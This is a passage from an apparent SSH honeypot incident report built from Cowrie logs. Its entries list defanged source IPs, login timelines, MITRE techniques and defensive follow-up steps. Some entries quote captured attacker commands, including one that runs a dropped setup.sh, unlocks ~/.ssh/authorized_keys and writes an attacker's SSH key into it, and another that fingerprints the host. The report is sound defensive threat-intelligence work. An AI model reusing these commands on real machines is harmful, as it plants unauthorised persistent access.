**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9715b8ddfb3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-13 03:12 |
| **Last Seen** | 2026-07-13 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:12:14` | `cowrie.session.connect` |
| `2026-07-13 03:12:14` | `cowrie.client.version` |
| `2026-07-13 03:12:14` | `cowrie.client.kex` |
| `2026-07-13 03:12:15` | `cowrie.login.success` |
| `2026-07-13 03:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b84714336cd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-13 03:12 |
| **Last Seen** | 2026-07-13 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:12:14` | `cowrie.session.connect` |
| `2026-07-13 03:12:14` | `cowrie.client.version` |
| `2026-07-13 03:12:14` | `cowrie.client.kex` |
| `2026-07-13 03:12:15` | `cowrie.login.success` |
| `2026-07-13 03:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f5eca3b25cf

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-13 03:15 |
| **Last Seen** | 2026-07-13 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:15:36` | `cowrie.session.connect` |
| `2026-07-13 03:15:36` | `cowrie.client.version` |
| `2026-07-13 03:15:36` | `cowrie.client.kex` |
| `2026-07-13 03:15:37` | `cowrie.login.success` |
| `2026-07-13 03:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ddd110d309c

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-13 03:15 |
| **Last Seen** | 2026-07-13 03:16 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.s` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:15:37` | `cowrie.session.connect` |
| `2026-07-13 03:15:37` | `cowrie.client.version` |
| `2026-07-13 03:15:37` | `cowrie.client.kex` |
| `2026-07-13 03:15:37` | `cowrie.login.success` |
| `2026-07-13 03:16:03` | `cowrie.session.params` |
| `2026-07-13 03:16:03` | `cowrie.command.input` |
| `2026-07-13 03:16:03` | `cowrie.log.closed` |
| `2026-07-13 03:16:03` | `cowrie.session.file_upload` |
| `2026-07-13 03:16:03` | `cowrie.session.file_upload` |
| `2026-07-13 03:16:03` | `cowrie.session.file_upload` |
| `2026-07-13 03:16:03` | `cowrie.session.file_upload` |
| `2026-07-13 03:16:03` | `cowrie.session.file_upload` |
| `2026-07-13 03:16:03` | `cowrie.session.file_upload` |
| `2026-07-13 03:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2b4398f7bc

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-07-13 03:19 |
| **Last Seen** | 2026-07-13 03:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:19:47` | `cowrie.session.connect` |
| `2026-07-13 03:19:48` | `cowrie.client.version` |
| `2026-07-13 03:19:48` | `cowrie.client.kex` |
| `2026-07-13 03:19:50` | `cowrie.login.success` |
| `2026-07-13 03:19:51` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506520d3d85c

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-07-13 03:23 |
| **Last Seen** | 2026-07-13 03:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:23:13` | `cowrie.session.connect` |
| `2026-07-13 03:23:14` | `cowrie.client.version` |
| `2026-07-13 03:23:14` | `cowrie.client.kex` |
| `2026-07-13 03:23:16` | `cowrie.login.success` |
| `2026-07-13 03:23:17` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce045403690

| Field | Detail |
|---|---|
| **Source IP** | `49.124.150[.]252` |
| **First Seen** | 2026-07-13 03:23 |
| **Last Seen** | 2026-07-13 03:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:23:23` | `cowrie.session.connect` |
| `2026-07-13 03:23:24` | `cowrie.client.version` |
| `2026-07-13 03:23:24` | `cowrie.client.kex` |
| `2026-07-13 03:23:26` | `cowrie.login.success` |
| `2026-07-13 03:23:27` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.150[.]252` to AbuseIPDB if not already reported
- [ ] Block `49.124.150[.]252` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b227bb225431

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 03:25 |
| **Last Seen** | 2026-07-13 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:25:15` | `cowrie.session.connect` |
| `2026-07-13 03:25:15` | `cowrie.client.version` |
| `2026-07-13 03:25:16` | `cowrie.client.kex` |
| `2026-07-13 03:25:16` | `cowrie.login.success` |
| `2026-07-13 03:25:17` | `cowrie.session.params` |
| `2026-07-13 03:25:17` | `cowrie.command.input` |
| `2026-07-13 03:25:17` | `cowrie.log.closed` |
| `2026-07-13 03:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827293c16ecc

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-07-13 03:27 |
| **Last Seen** | 2026-07-13 03:28 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:27:53` | `cowrie.session.connect` |
| `2026-07-13 03:27:55` | `cowrie.client.version` |
| `2026-07-13 03:27:55` | `cowrie.client.kex` |
| `2026-07-13 03:28:00` | `cowrie.login.success` |
| `2026-07-13 03:28:01` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64a868aafed

| Field | Detail |
|---|---|
| **Source IP** | `121.164.135[.]251` |
| **First Seen** | 2026-07-13 03:30 |
| **Last Seen** | 2026-07-13 03:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:30:47` | `cowrie.session.connect` |
| `2026-07-13 03:30:48` | `cowrie.client.version` |
| `2026-07-13 03:30:48` | `cowrie.client.kex` |
| `2026-07-13 03:30:50` | `cowrie.login.success` |
| `2026-07-13 03:30:51` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:30:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.164.135[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.164.135[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e71e5e5a74d2

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-07-13 03:30 |
| **Last Seen** | 2026-07-13 03:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:30:57` | `cowrie.session.connect` |
| `2026-07-13 03:30:58` | `cowrie.client.version` |
| `2026-07-13 03:30:58` | `cowrie.client.kex` |
| `2026-07-13 03:30:59` | `cowrie.login.success` |
| `2026-07-13 03:31:00` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd0bb17ce02

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-07-13 03:34 |
| **Last Seen** | 2026-07-13 03:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:34:22` | `cowrie.session.connect` |
| `2026-07-13 03:34:23` | `cowrie.client.version` |
| `2026-07-13 03:34:23` | `cowrie.client.kex` |
| `2026-07-13 03:34:25` | `cowrie.login.success` |
| `2026-07-13 03:34:26` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b8e49d6d3f4

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-07-13 03:34 |
| **Last Seen** | 2026-07-13 03:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:34:31` | `cowrie.session.connect` |
| `2026-07-13 03:34:32` | `cowrie.client.version` |
| `2026-07-13 03:34:32` | `cowrie.client.kex` |
| `2026-07-13 03:34:33` | `cowrie.login.success` |
| `2026-07-13 03:34:34` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb944646270d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 03:43 |
| **Last Seen** | 2026-07-13 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:43:32` | `cowrie.session.connect` |
| `2026-07-13 03:43:32` | `cowrie.client.version` |
| `2026-07-13 03:43:32` | `cowrie.client.kex` |
| `2026-07-13 03:43:33` | `cowrie.login.success` |
| `2026-07-13 03:43:33` | `cowrie.session.params` |
| `2026-07-13 03:43:33` | `cowrie.command.input` |
| `2026-07-13 03:43:34` | `cowrie.log.closed` |
| `2026-07-13 03:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-651a8fbe3b02

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 03:50 |
| **Last Seen** | 2026-07-13 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:50:18` | `cowrie.session.connect` |
| `2026-07-13 03:50:18` | `cowrie.client.version` |
| `2026-07-13 03:50:18` | `cowrie.client.kex` |
| `2026-07-13 03:50:18` | `cowrie.login.success` |
| `2026-07-13 03:50:18` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:50:18` | `cowrie.direct-tcpip.data` |
| `2026-07-13 03:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36cf7232d81d

| Field | Detail |
|---|---|
| **Source IP** | `120.79.199[.]56` |
| **First Seen** | 2026-07-13 03:52 |
| **Last Seen** | 2026-07-13 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:52:44` | `cowrie.session.connect` |
| `2026-07-13 03:52:44` | `cowrie.client.version` |
| `2026-07-13 03:52:44` | `cowrie.client.kex` |
| `2026-07-13 03:52:45` | `cowrie.login.success` |
| `2026-07-13 03:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.79.199[.]56` to AbuseIPDB if not already reported
- [ ] Block `120.79.199[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bed6eae0af

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]179` |
| **First Seen** | 2026-07-13 03:56 |
| **Last Seen** | 2026-07-13 03:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:56:39` | `cowrie.session.connect` |
| `2026-07-13 03:56:41` | `cowrie.client.version` |
| `2026-07-13 03:56:41` | `cowrie.client.kex` |
| `2026-07-13 03:56:43` | `cowrie.login.success` |
| `2026-07-13 03:56:44` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]179` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0cb3e10414

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-13 03:56 |
| **Last Seen** | 2026-07-13 03:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:56:50` | `cowrie.session.connect` |
| `2026-07-13 03:56:51` | `cowrie.client.version` |
| `2026-07-13 03:56:51` | `cowrie.client.kex` |
| `2026-07-13 03:56:52` | `cowrie.login.success` |
| `2026-07-13 03:56:52` | `cowrie.direct-tcpip.request` |
| `2026-07-13 03:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62d8def20dd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 03:57 |
| **Last Seen** | 2026-07-13 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 03:57:06` | `cowrie.session.connect` |
| `2026-07-13 03:57:06` | `cowrie.client.version` |
| `2026-07-13 03:57:06` | `cowrie.client.kex` |
| `2026-07-13 03:57:06` | `cowrie.login.success` |
| `2026-07-13 03:57:07` | `cowrie.session.params` |
| `2026-07-13 03:57:07` | `cowrie.command.input` |
| `2026-07-13 03:57:07` | `cowrie.log.closed` |
| `2026-07-13 03:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400bde4d2086

| Field | Detail |
|---|---|
| **Source IP** | `122.254.30[.]34` |
| **First Seen** | 2026-07-13 04:00 |
| **Last Seen** | 2026-07-13 04:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:00:01` | `cowrie.session.connect` |
| `2026-07-13 04:00:02` | `cowrie.client.version` |
| `2026-07-13 04:00:02` | `cowrie.client.kex` |
| `2026-07-13 04:00:04` | `cowrie.login.success` |
| `2026-07-13 04:00:05` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.254.30[.]34` to AbuseIPDB if not already reported
- [ ] Block `122.254.30[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86fd00afb32e

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]137` |
| **First Seen** | 2026-07-13 04:00 |
| **Last Seen** | 2026-07-13 04:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:00:15` | `cowrie.session.connect` |
| `2026-07-13 04:00:16` | `cowrie.client.version` |
| `2026-07-13 04:00:16` | `cowrie.client.kex` |
| `2026-07-13 04:00:18` | `cowrie.login.success` |
| `2026-07-13 04:00:19` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98027e972c13

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-07-13 04:14 |
| **Last Seen** | 2026-07-13 04:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:14:45` | `cowrie.session.connect` |
| `2026-07-13 04:14:46` | `cowrie.client.version` |
| `2026-07-13 04:14:46` | `cowrie.client.kex` |
| `2026-07-13 04:14:47` | `cowrie.login.success` |
| `2026-07-13 04:14:48` | `cowrie.direct-tcpip.request` |
| `2026-07-13 04:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9b002fb197c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 04:15 |
| **Last Seen** | 2026-07-13 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:15:23` | `cowrie.session.connect` |
| `2026-07-13 04:15:23` | `cowrie.client.version` |
| `2026-07-13 04:15:23` | `cowrie.client.kex` |
| `2026-07-13 04:15:23` | `cowrie.login.success` |
| `2026-07-13 04:15:24` | `cowrie.session.params` |
| `2026-07-13 04:15:24` | `cowrie.command.input` |
| `2026-07-13 04:15:24` | `cowrie.log.closed` |
| `2026-07-13 04:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c89a3cec4660

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-13 04:18 |
| **Last Seen** | 2026-07-13 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 04:18:28` | `cowrie.session.connect` |
| `2026-07-13 04:18:28` | `cowrie.client.version` |
| `2026-07-13 04:18:28` | `cowrie.client.kex` |
| `2026-07-13 04:18:29` | `cowrie.login.success` |
| `2026-07-13 04:18:29` | `cowrie.session.params` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.success` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:29` | `cowrie.command.input` |
| `2026-07-13 04:18:30` | `cowrie.log.closed` |
| `2026-07-13 04:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1350d2f5c47c

| Field | Detail |
